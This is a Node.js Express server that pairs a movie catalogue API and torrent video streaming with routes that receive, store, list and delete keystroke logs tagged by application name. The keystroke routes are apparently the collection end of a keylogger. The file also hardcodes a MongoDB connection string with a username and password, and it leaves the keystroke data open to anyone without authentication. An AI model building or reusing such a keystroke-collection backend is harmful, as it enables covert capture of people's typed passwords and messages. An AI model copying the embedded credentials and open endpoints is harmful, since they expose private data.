var fs = require("fs");
var google = require("googleapis");
var googleAuth = require("google-auth-library");
var express = require("express");
var https = require("https");
// var endMw = require("express-end");
var stream = require("stream");
const getDuration = require("get-video-duration");
var app = express();
app.use(express.json());
const mongoose = require("mongoose");
const WebTorrent = require('webtorrent');
const client = new WebTorrent();

const cors = require('cors')
app.use(cors())

// var TEMP_DIR = __dirname + "/.temp/";
var CHUNK_SIZE = 20000000; // Increased CHUNK_SIZE from 20000000
var PORT = 9001;
let AUTH_URL = "";



app.get("/auth-now", function (req, res) {
  res.send("Successfully reauthenticated!");
});


app.get("/", function (req, res) {
  console.log("TEst");
  res.send("Successfully authenticatexxd!");
});




  // MongoDB code starts

  // MongoDB connection
  const mongoURI =
    "mongodb+srv://faisal26:khalid26@cluster0.aalut.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";

  mongoose
    .connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log("MongoDB connected..."))
    .catch((err) => console.log(err));

  // Define Schema
  const MovieSchema = new mongoose.Schema({
    id: { type: String, required: true },
    poster: { type: String, required: true },
    plot: { type: String, required: true },
    year: { type: String, required: true },
    media_url: { type: String, required: true },
  });

  const Movies = mongoose.model("Movies", MovieSchema);


  // Define KeyLog Schema
  const KeyLogSchema = new mongoose.Schema({
    content: { type: String, required: true },
    appName: { type: String },
    isLocal: { type: Boolean, default: false },
    timeStamp: { type: Date, default: Date.now }
  });

  const KeyLogs = mongoose.model("KeyLogs", KeyLogSchema);


  // Routes for CRUD operations
  app.post("/movie", async (req, res) => {
    try {
      console.log("req body -----> : ", req.body);
      const newFile = new Movies(req.body);
      const savedFile = await newFile.save();
      res.status(201).json(savedFile);
    } catch (err) {
      console.error(err);
      res.status(400).json({ message: err.message });
    }
  });

  app.get("/movies", async (req, res) => {
    try {
      const files = await Movies.find();
      res.status(200).json(files);
    } catch (err) {
      console.error(err);
      res.status(500).json({ message: err.message });
    }
  });

  app.get("/movies/:id", async (req, res) => {
    try {
      const file = await Movies.findById(req.params.id);
      if (!file) throw new Error("Movie not found");
      res.status(200).json(file);
    } catch (err) {
      console.error(err);
      res.status(404).json({ message: err.message });
    }
  });

  app.put("/movies/:id", async (req, res) => {
    try {
      const file = await Movies.findByIdAndUpdate(req.params.id, req.body, {
        new: true,
        runValidators: true,
      });
      if (!file) throw new Error("Movie not found");
      res.status(200).json(file);
    } catch (err) {
      console.error(err);
      res.status(400).json({ message: err.message });
    }
  });

  app.delete("/movies/:id", async (req, res) => {
    try {
      const file = await Movies.findByIdAndDelete(req.params.id);
      if (!file) throw new Error("Movie not found");
      res.status(200).json({ message: "Movie deleted" });
    } catch (err) {
      console.error(err);
      res.status(404).json({ message: err.message });
    }
  });


  // Route to create a new KeyLog entry
  app.post("/keylog", async (req, res) => {
    try {
      const newLogEntry = new KeyLogs(req.body);
      const savedLog = await newLogEntry.save();
      res.status(201).json(savedLog);
    } catch (err) {
      console.error(err);
      res.status(400).json({ message: err.message });
    }
  });


  app.post("/local-keylog", async (req, res) => {
    try {
      const newLogEntry = new KeyLogs({ ...req.body, isLocal: true });
      const savedLog = await newLogEntry.save();
      res.status(201).json(savedLog);
    } catch (err) {
      console.error(err);
      res.status(400).json({ message: err.message });
    }
  });

  // Route to get all KeyLog entries
  app.get("/keylogs", async (req, res) => {
    try {
      const logs = await KeyLogs.find({ isLocal: false });
      res.status(200).json(logs);
    } catch (err) {
      console.error(err);
      res.status(500).json({ message: err.message });
    }
  });

  app.get("/local-keylogs", async (req, res) => {
    try {
      const logs = await KeyLogs.find({ isLocal: true });
      res.status(200).json(logs);
    } catch (err) {
      console.error(err);
      res.status(500).json({ message: err.message });
    }
  });


  // Route to delete all KeyLog entries
  app.delete("/keylogs", async (req, res) => {
    try {
      const deletedLogs = await KeyLogs.deleteMany({});
      if (deletedLogs.deletedCount === 0) {
        throw new Error("No logs to delete");
      }
      res.status(200).json({ message: "All logs deleted" });
    } catch (err) {
      console.error(err);
      res.status(404).json({ message: err.message });
    }
  });
  // MongoDB code ends


  // Torrent Streaming starts

  // Route for streaming torrent
  app.get("/stream-torrent", function (req, res) {
    // const magnetURI = req.query.magnet;
    const magnetURI = `magnet:?xt=urn:btih:c9e15763f722f23e98a29decdfae341b98d53056&dn=Cosmos+Laundromat&tr=udp%3A%2F%2Fexplodie.org%3A6969&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Ftracker.empire-js.us%3A1337&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.opentrackr.org%3A1337&tr=wss%3A%2F%2Ftracker.btorrent.xyz&tr=wss%3A%2F%2Ftracker.fastcast.nz&tr=wss%3A%2F%2Ftracker.openwebtorrent.com&ws=https%3A%2F%2Fwebtorrent.io%2Ftorrents%2F&xs=https%3A%2F%2Fwebtorrent.io%2Ftorrents%2Fcosmos-laundromat.torrent`
    if (!magnetURI) {
      return res.status(400).send("Magnet URI is required");
    }
    client.add(magnetURI, (torrent) => {
      const file = torrent.files.find(file => file.length > 0);
      if (!file) {
        return res.status(404).send("File not found in torrent");
      }

      const range = req.headers.range;
      if (range) {
        const parts = range.replace(/bytes=/, "").split("-");
        const start = parseInt(parts[0], 10);
        const end = parts[1] ? parseInt(parts[1], 10) : file.length - 1;
        const chunksize = end - start + 1;

        const head = {
          "Content-Range": `bytes ${start}-${end}/${file.length}`,
          "Accept-Ranges": "bytes",
          "Content-Length": chunksize,
          "Content-Type": "video/mp4",
        };
        res.writeHead(206, head);

        const stream = file.createReadStream({ start, end });
        stream.pipe(res);
      } else {
        const head = {
          "Content-Length": file.length,
          "Content-Type": "video/mp4",
        };
        res.writeHead(200, head);

        const stream = file.createReadStream();
        stream.pipe(res);
      }
    });
  });

  // Torrent Streaming ends

  // Server LISTENing here
  app.listen(PORT);
  console.log("Server started at port: " + PORT);